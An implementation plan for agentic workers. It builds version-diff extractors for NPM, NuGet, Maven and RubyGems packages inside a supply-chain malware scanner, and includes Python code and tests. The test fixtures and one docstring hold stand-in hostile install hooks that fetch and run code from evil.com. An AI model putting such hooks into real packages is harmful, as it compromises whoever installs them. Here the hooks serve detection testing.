# Version-Diff AI Rebuild — Phase 4: Diff extractors for NPM, NuGet, Maven, RubyGems

> **For agentic workers:** REQUIRED SUB-SKILL: Use cf-powers:subagent-driven-development (recommended) or cf-powers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Cover the remaining ecosystems by reusing the PyPI pattern from Phase 3. Each extractor reads two archives, produces a `DiffPayload`, and registers in `extractors_diff/__init__.py`.

**Architecture:** Each `extractors_diff/<eco>.py` follows the same `_read_archive` → `_diff` pipeline as `pypi.py`, with ecosystem-specific:
- archive format (NPM = tar.gz, NuGet = zip, Maven = jar/zip or pom.xml, RubyGems = nested tar)
- install-hook detection (NPM = JSON `scripts.{preinstall,install,postinstall}`, NuGet = `tools/install.ps1`, RubyGems = `ext/*/extconf.rb`)
- top-level code extension set (NPM = `.js/.ts/.cjs/.mjs`, NuGet = `.ps1/.targets/.props`, Maven = `.java/.kt/.groovy/.xml`, RubyGems = `.rb`)

The `_common.py` helpers from Phase 3 are reused as-is. `is_install_hook(ecosystem, path)` already covers NPM/NuGet/RubyGems via the `ecosystem` switch.

**Tech Stack:** Python 3.12 stdlib (`tarfile`, `zipfile`, `json`).

**Index:** [`plan-index.md`](./2026-04-30-version-diff-ai-rebuild-plan-index.md)

---

## Context for executor

The PyPI implementation in [scanner-bridge/extractors_diff/pypi.py](../../scanner-bridge/extractors_diff/pypi.py) is the structural reference. Each new extractor:

1. Defines its own `_read_archive` to handle the archive format.
2. Reuses `_diff()` logic — but `_diff()` is internal to `pypi.py`. To avoid copy-paste, **lift `_diff()` and `_filter_or_collect()` into `_common.py`** as Task 1, and have all extractors call `_common.diff_files(new_files, old_files, ecosystem, payload)`.
3. Provides ecosystem-specific archive readers.
4. NPM and Maven need their install-hook detection augmented (NPM scans JSON; Maven `pom.xml` is metadata, no install hook).

**Maven note:** Maven artifacts can be either `.jar` (zip) or `.pom` (xml). When the artifact is a bare pom.xml, both versions need to be reported as a single-file modified diff. When the artifact is a jar, treat it like a zip and use the same logic as NuGet/PyPI wheels.

**RubyGems note:** A `.gem` file is an outer non-gzipped tar containing `data.tar.gz`. Extract `data.tar.gz` first, then read its members. Use `tarfile.open(fileobj=BytesIO(...), mode="r:gz")` for the inner archive.

---

### Task 1: Refactor `_diff` into `_common.py` (DRY)

**Files:**
- Modify: [scanner-bridge/extractors_diff/_common.py](../../scanner-bridge/extractors_diff/_common.py)
- Modify: [scanner-bridge/extractors_diff/pypi.py](../../scanner-bridge/extractors_diff/pypi.py)

- [ ] **Step 1: Add `diff_files` to `_common.py`**

In [scanner-bridge/extractors_diff/_common.py](../../scanner-bridge/extractors_diff/_common.py), append:

```python
def diff_files(
    new_files: dict[str, bytes],
    old_files: dict[str, bytes],
    ecosystem: str,
    payload: DiffPayload,
    *,
    install_hook_detector=is_install_hook,
) -> None:
    """Populate payload from two file maps. Ecosystem-aware install hook detection.

    Caller must have already populated payload.error / payload.partial.
    """
    new_keys = set(new_files)
    old_keys = set(old_files)

    raw_added = sorted(new_keys - old_keys)
    raw_removed = sorted(old_keys - new_keys)
    raw_modified = sorted(
        k for k in (new_keys & old_keys) if new_files[k] != old_files[k]
    )

    payload["raw_counts"] = (len(raw_added), len(raw_modified), len(raw_removed))

    inspected_added: list[str] = []
    inspected_modified: list[str] = []
    inspected_removed: list[str] = []
    ignored: list[str] = []

    for path in raw_added:
        if _filter_or_collect(path, ignored, ecosystem=ecosystem,
                              install_hook_detector=install_hook_detector):
            continue
        inspected_added.append(path)

    for path in raw_modified:
        if _filter_or_collect(path, ignored, ecosystem=ecosystem,
                              install_hook_detector=install_hook_detector):
            continue
        inspected_modified.append(path)

    for path in raw_removed:
        if _filter_or_collect(path, ignored, ecosystem=ecosystem,
                              install_hook_detector=install_hook_detector):
            continue
        inspected_removed.append(path)

    payload["inspected_counts"] = (
        len(inspected_added), len(inspected_modified), len(inspected_removed),
    )
    payload["ignored_changed_paths"] = ignored
    payload["removed"] = inspected_removed

    install_hooks: list[str] = []
    top_level: list[str] = []
    truncated: list[str] = []

    for path in inspected_added:
        blob = new_files[path]
        if not blob:
            ignored.append(path + " (oversize)")
            continue
        text = safe_decode(blob)
        is_hook = install_hook_detector(ecosystem, path)
        truncated_text, was_trunc = truncate_content(text, install_hook=is_hook)
        payload["added"][path] = truncated_text
        if was_trunc:
            truncated.append(path)
        if is_hook:
            install_hooks.append(path)
        elif is_top_level_code(path):
            top_level.append(path)

    for path in inspected_modified:
        old_blob = old_files[path]
        new_blob = new_files[path]
        if not old_blob or not new_blob:
            ignored.append(path + " (oversize)")
            continue
        old_text = safe_decode(old_blob)
        new_text = safe_decode(new_blob)
        diff = unified_diff(old_text, new_text, path)
        is_hook = install_hook_detector(ecosystem, path)
        diff_truncated, was_trunc = truncate_content(diff, install_hook=is_hook)
        payload["modified"][path] = ("[unified diff follows]\n" + diff_truncated, "")
        if was_trunc:
            truncated.append(path)
        if is_hook:
            install_hooks.append(path)
        elif is_top_level_code(path):
            top_level.append(path)

    payload["install_hook_paths"] = install_hooks
    payload["top_level_code_paths"] = top_level
    payload["truncated_files"] = truncated


def _filter_or_collect(path: str, ignored: list[str], *,
                       ecosystem: str = "pypi",
                       install_hook_detector=is_install_hook) -> bool:
    """Returns True if the path should be skipped from inspection.

    Install hooks bypass the test/example/docs filter — see security note in
    is_filtered_path docstring.
    """
    if is_binary_path(path):
        ignored.append(path + " (binary)")
        return True
    if install_hook_detector(ecosystem, path):
        return False  # always inspect install hooks
    if is_filtered_path(path):
        ignored.append(path + " (test/example/docs)")
        return True
    return False
```

- [ ] **Step 2: Replace `_diff` and `_filter_or_collect` calls in `pypi.py`**

In [scanner-bridge/extractors_diff/pypi.py](../../scanner-bridge/extractors_diff/pypi.py):

1. Delete the local `_diff()` and `_filter_or_collect()` functions.
2. Replace the `_diff(new_files, old_files, payload)` call inside `extract()` with:

```python
    from extractors_diff._common import diff_files
    diff_files(new_files, old_files, "pypi", payload)
```

(Or hoist the import to the top of the file.)

- [ ] **Step 3: Re-run Phase 3 tests to confirm refactor is behavior-preserving**

```bash
cd scanner-bridge
uv run pytest tests/test_extractors_diff.py -v
```

Expected: every PyPI test still passes.

- [ ] **Step 4: Commit**

```bash
git add scanner-bridge/extractors_diff/_common.py scanner-bridge/extractors_diff/pypi.py
git commit -m "refactor(bridge): hoist diff_files into extractors_diff._common"
```

---

### Task 2: Implement `extractors_diff/npm.py`

**Files:**
- Create: `scanner-bridge/extractors_diff/npm.py`

NPM tarballs nest everything under `package/`. Install hooks are values inside `package.json`'s `scripts` block. We surface the hook *values* (the actual command strings) as added/modified entries with synthetic paths so the LLM sees them.

- [ ] **Step 1: Write the NPM extractor**

Create [scanner-bridge/extractors_diff/npm.py](../../scanner-bridge/extractors_diff/npm.py):

```python
"""NPM diff extractor — compares two npm tarballs (.tgz)."""

from __future__ import annotations

import json
import logging
import os
import tarfile

from extractors_diff._common import (
    DEFAULT_MAX_AGGREGATE_BYTES,
    DEFAULT_MAX_FILES,
    MAX_FILE_BYTES,
    DiffPayload,
    diff_files,
    empty_payload,
    is_install_hook,
    is_path_traversal,
    normalize_path,
)

logger = logging.getLogger(__name__)

INSTALL_HOOKS = {"preinstall", "install", "postinstall"}


def extract(new_path: str, old_path: str, *, original_filename: str = "") -> DiffPayload:
    payload = empty_payload()
    new_files = _read_tgz(new_path, payload, "new")
    if payload["error"]:
        return payload
    old_files = _read_tgz(old_path, payload, "old")
    if payload["error"]:
        return payload

    # Inject synthetic entries for install-hook script *values* so the diff
    # captures malicious payloads embedded in package.json scripts.
    _inject_npm_script_synthetic(new_files, payload, side="new")
    _inject_npm_script_synthetic(old_files, payload, side="old")

    diff_files(new_files, old_files, "npm", payload, install_hook_detector=_npm_hook)
    return payload


def _read_tgz(path: str, payload: DiffPayload, side: str) -> dict[str, bytes]:
    if not os.path.isfile(path):
        payload["error"] = f"{side} artifact not found: {path}"
        return {}

    out: dict[str, bytes] = {}
    aggregate = 0
    file_count = 0
    try:
        with tarfile.open(path, "r:gz") as tf:
            for member in tf.getmembers():
                if member.issym() or member.islnk():
                    continue  # links can escape archive; we read content not links
                if not member.isfile():
                    continue
                norm = normalize_path(member.name)
                if is_path_traversal(member.name) or is_path_traversal(norm):
                    continue

                file_count += 1
                if file_count > DEFAULT_MAX_FILES:
                    payload["partial"] = True
                    break

                try:
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    blob = f.read(MAX_FILE_BYTES + 1)
                except Exception as e:
                    logger.warning("npm diff extractor: read failed for %s: %s", member.name, e)
                    continue

                if len(blob) > MAX_FILE_BYTES:
                    out[norm] = b""
                    continue

                aggregate += len(blob)
                if aggregate > DEFAULT_MAX_AGGREGATE_BYTES:
                    payload["partial"] = True
                    out[norm] = b""
                    break

                out[norm] = blob
    except Exception as e:
        payload["error"] = f"{side} tar.gz open failed: {e}"
        return {}
    return out


def _inject_npm_script_synthetic(files: dict[str, bytes], payload: DiffPayload, *, side: str) -> None:
    """Surface install-hook script values as synthetic file entries.

    Inserts npm:scripts/<hook> entries with the script command as content so the
    diff can detect a postinstall change like 'curl evil.com | sh'.
    """
    pkg_path = next((p for p in files if p.endswith("package.json")), None)
    if pkg_path is None:
        return
    blob = files.get(pkg_path) or b""
    if not blob:
        return
    try:
        pkg = json.loads(blob.decode("utf-8", errors="replace"))
    except Exception:
        return
    scripts = pkg.get("scripts", {}) if isinstance(pkg, dict) else {}
    if not isinstance(scripts, dict):
        return
    for hook in INSTALL_HOOKS:
        cmd = scripts.get(hook)
        if isinstance(cmd, str) and cmd:
            files[f"npm:scripts/{hook}"] = cmd.encode("utf-8")


def _npm_hook(ecosystem: str, path: str) -> bool:
    """NPM-specific install-hook detector. Marks synthetic npm:scripts/* entries."""
    if path.startswith("npm:scripts/"):
        return True
    return is_install_hook(ecosystem, path)
```

- [ ] **Step 2: Register NPM in `__init__.py`**

In [scanner-bridge/extractors_diff/__init__.py](../../scanner-bridge/extractors_diff/__init__.py):

```python
from extractors_diff.npm import extract as extract_npm

EXTRACTORS = {
    "pypi": extract_pypi,
    "npm": extract_npm,
}
```

(No commit — combined with all four ecosystem registrations at the end.)

---

### Task 3: Implement `extractors_diff/nuget.py`

**Files:**
- Create: `scanner-bridge/extractors_diff/nuget.py`

NuGet packages are `.nupkg` files = zip archives. Standard zip handling.

- [ ] **Step 1: Write the NuGet extractor**

Create [scanner-bridge/extractors_diff/nuget.py](../../scanner-bridge/extractors_diff/nuget.py):

```python
"""NuGet diff extractor — compares two .nupkg packages (zip archives)."""

from __future__ import annotations

import logging
import os
import zipfile

from extractors_diff._common import (
    DEFAULT_MAX_AGGREGATE_BYTES,
    DEFAULT_MAX_FILES,
    MAX_FILE_BYTES,
    DiffPayload,
    diff_files,
    empty_payload,
    is_path_traversal,
    normalize_path,
)

logger = logging.getLogger(__name__)


def extract(new_path: str, old_path: str, *, original_filename: str = "") -> DiffPayload:
    payload = empty_payload()
    new_files = _read_zip(new_path, payload, "new")
    if payload["error"]:
        return payload
    old_files = _read_zip(old_path, payload, "old")
    if payload["error"]:
        return payload

    diff_files(new_files, old_files, "nuget", payload)
    return payload


def _read_zip(path: str, payload: DiffPayload, side: str) -> dict[str, bytes]:
    if not os.path.isfile(path):
        payload["error"] = f"{side} artifact not found: {path}"
        return {}

    out: dict[str, bytes] = {}
    aggregate = 0
    file_count = 0
    try:
        with zipfile.ZipFile(path, "r") as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                norm = normalize_path(info.filename)
                if is_path_traversal(info.filename) or is_path_traversal(norm):
                    continue
                file_count += 1
                if file_count > DEFAULT_MAX_FILES:
                    payload["partial"] = True
                    break
                try:
                    # Stream-read with cap+1 — never trust info.file_size.
                    with zf.open(info.filename, "r") as f:
                        blob = f.read(MAX_FILE_BYTES + 1)
                except Exception as e:
                    logger.warning("nuget diff extractor: read failed for %s: %s", info.filename, e)
                    continue
                if len(blob) > MAX_FILE_BYTES:
                    out[norm] = b""
                    continue
                aggregate += len(blob)
                if aggregate > DEFAULT_MAX_AGGREGATE_BYTES:
                    payload["partial"] = True
                    out[norm] = b""
                    break
                out[norm] = blob
    except Exception as e:
        payload["error"] = f"{side} zip open failed: {e}"
        return {}
    return out
```

- [ ] **Step 2: Register NuGet in `__init__.py`**

```python
from extractors_diff.nuget import extract as extract_nuget

EXTRACTORS["nuget"] = extract_nuget
```

(No commit yet.)

---

### Task 4: Implement `extractors_diff/maven.py`

**Files:**
- Create: `scanner-bridge/extractors_diff/maven.py`

Maven artifacts can be `.jar` (zip) or a bare `.pom` (XML file). Detect via magic byte first, then filename hint.

- [ ] **Step 1: Write the Maven extractor**

```python
"""Maven diff extractor — compares two .jar (zip) or .pom (xml) artifacts."""

from __future__ import annotations

import logging
import os
import zipfile

from extractors_diff._common import (
    DEFAULT_MAX_AGGREGATE_BYTES,
    DEFAULT_MAX_FILES,
    MAX_FILE_BYTES,
    DiffPayload,
    diff_files,
    empty_payload,
    is_path_traversal,
    normalize_path,
)

logger = logging.getLogger(__name__)


def extract(new_path: str, old_path: str, *, original_filename: str = "") -> DiffPayload:
    payload = empty_payload()
    new_files = _read_artifact(new_path, original_filename, payload, "new")
    if payload["error"]:
        return payload
    old_files = _read_artifact(old_path, original_filename, payload, "old")
    if payload["error"]:
        return payload

    diff_files(new_files, old_files, "maven", payload)
    return payload


def _detect_format(path: str, original_filename: str) -> str:
    try:
        if zipfile.is_zipfile(path):
            return "zip"
    except Exception:
        pass
    name = (original_filename or path).lower()
    if name.endswith(".jar") or name.endswith(".war") or name.endswith(".zip"):
        return "zip"
    if name.endswith(".pom") or name.endswith(".xml"):
        return "xml"
    return ""


def _read_artifact(path: str, original_filename: str, payload: DiffPayload, side: str) -> dict[str, bytes]:
    if not os.path.isfile(path):
        payload["error"] = f"{side} artifact not found: {path}"
        return {}

    fmt = _detect_format(path, original_filename)
    if fmt == "zip":
        return _read_jar(path, payload, side)
    if fmt == "xml":
        return _read_pom(path, payload, side)
    payload["error"] = f"{side} maven artifact: unsupported format ({path})"
    return {}


def _read_jar(path: str, payload: DiffPayload, side: str) -> dict[str, bytes]:
    out: dict[str, bytes] = {}
    aggregate = 0
    file_count = 0
    try:
        with zipfile.ZipFile(path, "r") as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                norm = normalize_path(info.filename)
                if is_path_traversal(info.filename) or is_path_traversal(norm):
                    continue
                file_count += 1
                if file_count > DEFAULT_MAX_FILES:
                    payload["partial"] = True
                    break
                try:
                    with zf.open(info.filename, "r") as f:
                        blob = f.read(MAX_FILE_BYTES + 1)
                except Exception as e:
                    logger.warning("maven diff extractor: read failed for %s: %s", info.filename, e)
                    continue
                if len(blob) > MAX_FILE_BYTES:
                    out[norm] = b""
                    continue
                aggregate += len(blob)
                if aggregate > DEFAULT_MAX_AGGREGATE_BYTES:
                    payload["partial"] = True
                    out[norm] = b""
                    break
                out[norm] = blob
    except Exception as e:
        payload["error"] = f"{side} jar open failed: {e}"
        return {}
    return out


def _read_pom(path: str, payload: DiffPayload, side: str) -> dict[str, bytes]:
    try:
        with open(path, "rb") as f:
            blob = f.read(MAX_FILE_BYTES + 1)
    except Exception as e:
        payload["error"] = f"{side} pom read failed: {e}"
        return {}
    if len(blob) > MAX_FILE_BYTES:
        return {"pom.xml": b""}
    return {"pom.xml": blob}
```

- [ ] **Step 2: Register Maven in `__init__.py`**

```python
from extractors_diff.maven import extract as extract_maven

EXTRACTORS["maven"] = extract_maven
```

---

### Task 5: Implement `extractors_diff/rubygems.py`

**Files:**
- Create: `scanner-bridge/extractors_diff/rubygems.py`

A `.gem` file is an outer non-gzipped tar containing `data.tar.gz` and `metadata.gz`. We need to crack open `data.tar.gz` to get the package contents.

- [ ] **Step 1: Write the RubyGems extractor**

```python
"""RubyGems diff extractor — compares two .gem packages (nested tar)."""

from __future__ import annotations

import io
import logging
import os
import tarfile

from extractors_diff._common import (
    DEFAULT_MAX_AGGREGATE_BYTES,
    DEFAULT_MAX_FILES,
    MAX_FILE_BYTES,
    DiffPayload,
    diff_files,
    empty_payload,
    is_path_traversal,
    normalize_path,
)

logger = logging.getLogger(__name__)


def extract(new_path: str, old_path: str, *, original_filename: str = "") -> DiffPayload:
    payload = empty_payload()
    new_files = _read_gem(new_path, payload, "new")
    if payload["error"]:
        return payload
    old_files = _read_gem(old_path, payload, "old")
    if payload["error"]:
        return payload

    diff_files(new_files, old_files, "rubygems", payload)
    return payload


def _read_gem(path: str, payload: DiffPayload, side: str) -> dict[str, bytes]:
    if not os.path.isfile(path):
        payload["error"] = f"{side} artifact not found: {path}"
        return {}

    try:
        with tarfile.open(path, "r") as outer:
            data_member = next(
                (m for m in outer.getmembers() if m.name == "data.tar.gz"),
                None,
            )
            if data_member is None:
                payload["error"] = f"{side} .gem missing data.tar.gz"
                return {}
            data_file = outer.extractfile(data_member)
            if data_file is None:
                payload["error"] = f"{side} cannot read data.tar.gz"
                return {}
            data_blob = data_file.read()
    except Exception as e:
        payload["error"] = f"{side} outer .gem open failed: {e}"
        return {}

    out: dict[str, bytes] = {}
    aggregate = 0
    file_count = 0
    try:
        with tarfile.open(fileobj=io.BytesIO(data_blob), mode="r:gz") as tf:
            for member in tf.getmembers():
                if member.issym() or member.islnk():
                    continue
                if not member.isfile():
                    continue
                norm = normalize_path(member.name)
                if is_path_traversal(member.name) or is_path_traversal(norm):
                    continue
                file_count += 1
                if file_count > DEFAULT_MAX_FILES:
                    payload["partial"] = True
                    break
                f = tf.extractfile(member)
                if f is None:
                    continue
                blob = f.read(MAX_FILE_BYTES + 1)
                if len(blob) > MAX_FILE_BYTES:
                    out[norm] = b""
                    continue
                aggregate += len(blob)
                if aggregate > DEFAULT_MAX_AGGREGATE_BYTES:
                    payload["partial"] = True
                    out[norm] = b""
                    break
                out[norm] = blob
    except Exception as e:
        payload["error"] = f"{side} inner data.tar.gz open failed: {e}"
        return {}

    return out
```

- [ ] **Step 2: Register RubyGems in `__init__.py`**

The final `__init__.py` should look like:

```python
"""Per-ecosystem diff extractors for the AI-driven version-diff scanner."""

from typing import Callable

from extractors_diff._common import DiffPayload, empty_payload
from extractors_diff.pypi import extract as extract_pypi
from extractors_diff.npm import extract as extract_npm
from extractors_diff.nuget import extract as extract_nuget
from extractors_diff.maven import extract as extract_maven
from extractors_diff.rubygems import extract as extract_rubygems

EXTRACTORS: dict[str, Callable[..., DiffPayload]] = {
    "pypi": extract_pypi,
    "npm": extract_npm,
    "nuget": extract_nuget,
    "maven": extract_maven,
    "rubygems": extract_rubygems,
}

__all__ = ["EXTRACTORS", "DiffPayload", "empty_payload"]
```

---

### Task 6: Add unit tests for NPM, NuGet, Maven, RubyGems

**Files:**
- Modify: [scanner-bridge/tests/test_extractors_diff.py](../../scanner-bridge/tests/test_extractors_diff.py)

- [ ] **Step 1: Append the new test classes**

In [scanner-bridge/tests/test_extractors_diff.py](../../scanner-bridge/tests/test_extractors_diff.py), append at the bottom:

```python
import gzip
import json as _json

from extractors_diff.npm import extract as extract_npm
from extractors_diff.nuget import extract as extract_nuget
from extractors_diff.maven import extract as extract_maven
from extractors_diff.rubygems import extract as extract_rubygems


def _make_npm_tarball(path, files: dict[str, str]):
    """Create an npm-style tarball with files nested under package/."""
    with tarfile.open(path, "w:gz") as tf:
        for name, content in files.items():
            blob = content.encode("utf-8")
            info = tarfile.TarInfo(name=f"package/{name}")
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))


def _make_nupkg(path, files: dict[str, str]):
    with zipfile.ZipFile(path, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)


def _make_jar(path, files: dict[str, str]):
    _make_nupkg(path, files)


def _make_gem(path, data_files: dict[str, str]):
    """Create a .gem (outer tar with data.tar.gz inside)."""
    inner = io.BytesIO()
    with tarfile.open(fileobj=inner, mode="w:gz") as inner_tf:
        for name, content in data_files.items():
            blob = content.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(blob)
            inner_tf.addfile(info, io.BytesIO(blob))
    inner_blob = inner.getvalue()

    with tarfile.open(path, "w") as outer:
        info = tarfile.TarInfo(name="data.tar.gz")
        info.size = len(inner_blob)
        outer.addfile(info, io.BytesIO(inner_blob))
        meta = b'{"name":"foo","version":"1.0"}'
        info2 = tarfile.TarInfo(name="metadata.gz")
        info2.size = len(meta)
        outer.addfile(info2, io.BytesIO(meta))


class TestNPMDiffExtractor:
    def test_postinstall_change_surfaced_as_synthetic(self, tmp_path):
        new = tmp_path / "foo-1.1.tgz"
        old = tmp_path / "foo-1.0.tgz"
        _make_npm_tarball(new, {
            "package.json": _json.dumps({"name": "foo", "version": "1.1",
                "scripts": {"postinstall": "curl evil.com | sh"}}),
            "index.js": "module.exports = {};",
        })
        _make_npm_tarball(old, {
            "package.json": _json.dumps({"name": "foo", "version": "1.0",
                "scripts": {"postinstall": "echo hello"}}),
            "index.js": "module.exports = {};",
        })

        payload = extract_npm(str(new), str(old))
        assert not payload["error"]
        assert "npm:scripts/postinstall" in payload["modified"]
        assert "npm:scripts/postinstall" in payload["install_hook_paths"]
        diff_text = payload["modified"]["npm:scripts/postinstall"][0]
        assert "curl evil.com" in diff_text


class TestNuGetDiffExtractor:
    def test_install_ps1_change(self, tmp_path):
        new = tmp_path / "Foo.1.1.nupkg"
        old = tmp_path / "Foo.1.0.nupkg"
        _make_nupkg(new, {
            "tools/install.ps1": "Invoke-WebRequest -Uri 'http://evil/x'",
            "lib/net6.0/Foo.dll": "dummy",
        })
        _make_nupkg(old, {
            "tools/install.ps1": "Write-Host 'installed'",
            "lib/net6.0/Foo.dll": "dummy",
        })
        payload = extract_nuget(str(new), str(old))
        assert not payload["error"]
        assert "tools/install.ps1" in payload["install_hook_paths"]
        assert "tools/install.ps1" in payload["modified"]


class TestMavenDiffExtractor:
    def test_jar_pom_xml_modified(self, tmp_path):
        new = tmp_path / "foo-1.1.jar"
        old = tmp_path / "foo-1.0.jar"
        _make_jar(new, {
            "META-INF/maven/foo/pom.xml": "<project><version>1.1</version></project>",
            "Foo.class": "dummy bytes",
        })
        _make_jar(old, {
            "META-INF/maven/foo/pom.xml": "<project><version>1.0</version></project>",
            "Foo.class": "dummy bytes",
        })
        payload = extract_maven(str(new), str(old))
        assert not payload["error"]
        assert any(p.endswith("pom.xml") for p in payload["modified"])

    def test_bare_pom_artifact(self, tmp_path):
        new = tmp_path / "foo-1.1.pom"
        old = tmp_path / "foo-1.0.pom"
        new.write_text("<project><version>1.1</version></project>")
        old.write_text("<project><version>1.0</version></project>")
        payload = extract_maven(str(new), str(old), original_filename="foo-1.1.pom")
        assert not payload["error"]
        assert "pom.xml" in payload["modified"]


class TestRubyGemsDiffExtractor:
    def test_extconf_rb_change(self, tmp_path):
        new = tmp_path / "foo-1.1.gem"
        old = tmp_path / "foo-1.0.gem"
        _make_gem(new, {
            "ext/native/extconf.rb": "system('curl evil.com')",
            "lib/foo.rb": "module Foo; VERSION='1.1'; end",
        })
        _make_gem(old, {
            "ext/native/extconf.rb": "require 'mkmf'\ncreate_makefile('foo')",
            "lib/foo.rb": "module Foo; VERSION='1.0'; end",
        })
        payload = extract_rubygems(str(new), str(old))
        assert not payload["error"]
        assert "ext/native/extconf.rb" in payload["install_hook_paths"]
        assert "ext/native/extconf.rb" in payload["modified"]
```

- [ ] **Step 2: Run tests**

```bash
cd scanner-bridge
uv run pytest tests/test_extractors_diff.py -v
```

Expected: all tests pass, including the four new ecosystem classes.

- [ ] **Step 3: Run the full bridge test suite**

```bash
cd scanner-bridge
uv run pytest tests/ -v
```

Expected: all tests pass.

- [ ] **Step 4: Commit**

```bash
git add scanner-bridge/extractors_diff/__init__.py \
        scanner-bridge/extractors_diff/npm.py \
        scanner-bridge/extractors_diff/nuget.py \
        scanner-bridge/extractors_diff/maven.py \
        scanner-bridge/extractors_diff/rubygems.py \
        scanner-bridge/tests/test_extractors_diff.py
git commit -m "feat(bridge): npm/nuget/maven/rubygems diff extractors"
```

---

## Verification — phase-end

```bash
# All five ecosystems registered
cd scanner-bridge && uv run python -c "from extractors_diff import EXTRACTORS; print(sorted(EXTRACTORS.keys()))"
# → ['maven', 'npm', 'nuget', 'pypi', 'rubygems']

# Tests green
cd scanner-bridge && uv run pytest tests/test_extractors_diff.py -v

# No regression
cd scanner-bridge && uv run pytest tests/ -v
```

## What this phase ships

- Four new ecosystem-specific extractors (NPM, NuGet, Maven, RubyGems).
- A refactor that hoists `_diff` and `_filter_or_collect` into shared helpers.
- A registry update so Phase 5 can resolve any of the five ecosystems.

## Risks during this phase

- **NPM script values may contain user-supplied content with newlines.** The diff still works; truncation may obscure long shell pipelines. The 8 KB threshold is generous for npm scripts.
- **Maven `pom.xml`-only artifacts** are common for parent POMs. The XML-mode path produces a single-file diff — the LLM sees XML changes, but pom.xml is metadata, never an install hook. Phase 5 prompt will treat it as low-signal context.
- **RubyGems gems with absent `data.tar.gz`** (corrupted gem) set `payload.error` and bail. The Go side treats this as fail-open (CLEAN + log).
